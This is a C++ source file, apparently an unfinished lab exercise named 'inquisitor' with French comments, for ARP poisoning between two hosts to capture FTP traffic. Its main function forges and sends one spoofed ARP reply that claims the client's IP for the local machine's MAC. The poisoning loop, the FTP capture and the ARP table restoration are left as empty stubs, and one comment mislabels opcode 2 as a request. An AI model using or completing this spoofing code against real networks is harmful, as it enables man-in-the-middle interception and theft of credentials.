#include <iostream>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <pcap.h>
#include <stdint.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>

struct eth_header
{
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint16_t eth_type;
};

struct arp_packet
{
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_len;
    uint8_t proto_len;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};

void signalHandler(int signum)
{
    std::cout << "Interception du signal " << signum << ", restauration des tables ARP et sortie.\n";
    // Ici, ajoutez le code pour restaurer les tables ARP
    exit(signum);
}

void performArpPoisoning(const char *ipSrc, const char *macSrc, const char *ipTarget, const char *macTarget)
{
    // Votre code pour envoyer des paquets ARP forgés
}

void captureFtpPackets()
{
    // Votre code pour utiliser libpcap pour capturer et filtrer les paquets FTP
}

void checkArgs(const char *ipSrc, const char *macSrc, const char *ipTarget, const char *macTarget)
{
}

int getLocalInfo(const char *iface, uint8_t *ip_address, uint8_t *mac_address)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) != -1)
    {
        struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
        memcpy(ip_address, &(ipaddr->sin_addr.s_addr), 4);
    }
    else
    {
        return -1;
    }

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != -1)
    {
        memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
    }
    else
    {
        return -1;
    }
    close(fd);
    return 0;
}

// g++ inquisitor.cpp -o inquisitor -lpcap && ./inquisitor 172.20.0.2 02:42:ac:14:00:02 172.20.0.4 02:42:ac:14:00:04
int main(int argc, char *argv[])
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    if (argc < 4)
    {
        std::cout << "Usage: " << argv[0] << " <IP-src> <MAC-src> <IP-target> <MAC-target>" << std::endl;
        return 1;
    }

    signal(SIGINT, signalHandler);

    const char *ipServer = argv[1];
    const char *macServer = argv[2];
    const char *ipClient = argv[3];
    const char *macClient = argv[4];

    checkArgs(ipServer, macServer, ipClient, macClient);
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
        return 2;
    }
    else
    {
        std::cout << "handle : " << handle << std::endl;
    }

    std::cout << "test ipserv : " << ipServer << std::endl;

    // convert ipServer to uint array
    uint8_t ip_address[4];
    if (inet_pton(AF_INET, ipServer, ip_address) <= 0)
    {
        std::cout << "inet_pton failed" << std::endl;
        return 1;
    }
    else
    {
        std::cout << "inet_pton succeeded" << std::endl;
    }

    // Convert la chaîne MAC en tableau de uint
    uint8_t mac_address[6];
    sscanf(macServer, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_address[0], &mac_address[1], &mac_address[2],
           &mac_address[3], &mac_address[4], &mac_address[5]);

    // Remplir les champs du paquet ARP
    arp_packet arp = {
        hw_type : htons(0x0001),    // Ethernet
        proto_type : htons(0x0800), // IP
        hw_len : 6,                 // MAC address length
        proto_len : 4,              // IP address length
        opcode : htons(2),          // ARP Request
    };
    memcpy(arp.target_mac, mac_address, 6);
    memcpy(arp.target_ip, ip_address, 4);

    uint8_t local_ip_address[4];
    uint8_t local_mac_address[6];
    if (getLocalInfo("eth0", local_ip_address, local_mac_address) == -1)
    {
        std::cout << "Failed to get local IP and MAC address." << std::endl;
        return 1;
    }

    // For debugging
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, local_ip_address, ip_str, INET_ADDRSTRLEN);
    printf("mon ip: %s\n", ip_str);
    char mac_str[18];
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            local_mac_address[0], local_mac_address[1], local_mac_address[2],
            local_mac_address[3], local_mac_address[4], local_mac_address[5]);
    printf("mon mac: %s\n", mac_str);
    fflush(stdout);

    // convert ipClient to uint array
    uint8_t ip_address_client[4];
    if (inet_pton(AF_INET, ipClient, ip_address_client) <= 0)
    {
        std::cout << "inet_pton failed" << std::endl;
        return 1;
    }
    else
    {
        std::cout << "inet_pton succeeded" << std::endl;
    }
    memcpy(arp.sender_mac, local_mac_address, 6);
    memcpy(arp.sender_ip, ip_address_client, 4);

    uint8_t packet[sizeof(eth_header) + sizeof(arp_packet)];
    eth_header eth = {
        eth_type : htons(0x0806), // ARP 0x0806, IPv4 0x0800.
    };
    memcpy(eth.dest_mac, mac_address, 6);
    memcpy(eth.src_mac, local_mac_address, 6);

    // build packet
    memcpy(packet, &eth, sizeof(eth_header));
    memcpy(packet + sizeof(eth_header), &arp, sizeof(arp_packet));

    std::cout << "packet : " << std::endl;
    for (size_t i = 0; i < sizeof(packet); ++i)
    {
        printf("%02x ", packet[i]);
    }
    printf("\n");
    fflush(stdout);

    // Send packet
    int test = pcap_sendpacket(handle, packet, sizeof(packet));
    if (test != 0)
    {
        fprintf(stderr, "\npcap_sendpacket() failed\n");
        return 1;
    }
    else
    {
        std::cout << "send ARP packet" << test << std::endl;
    }

    // Close the handle
    pcap_close(handle);

    // Appeler la fonction pour faire de l'ARP poisoning
    performArpPoisoning(ipServer, macServer, ipClient, macClient);

    // Appeler la fonction pour capturer les paquets FTP
    captureFtpPackets();

    return 0;
}